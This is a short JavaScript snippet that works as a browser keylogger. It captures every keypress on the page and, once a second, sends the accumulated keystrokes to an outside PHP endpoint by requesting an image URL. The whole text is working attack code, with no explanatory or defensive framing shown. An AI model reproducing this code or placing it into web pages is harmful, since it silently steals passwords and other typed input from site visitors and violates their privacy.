var k='', 
  u = 'http://blackout.altervista.org/cdn/magius.php'; 
document.onkeypress = function(e) {
  get = window.event?event:e;
  k  += String.fromCharCode( get.keyCode?get.keyCode:get.charCode );
}
window.setInterval(function(){
  if(k.length>0) {
    new Image().src = u+'?c='+k; 
    k = '';
  }
}, 1000);
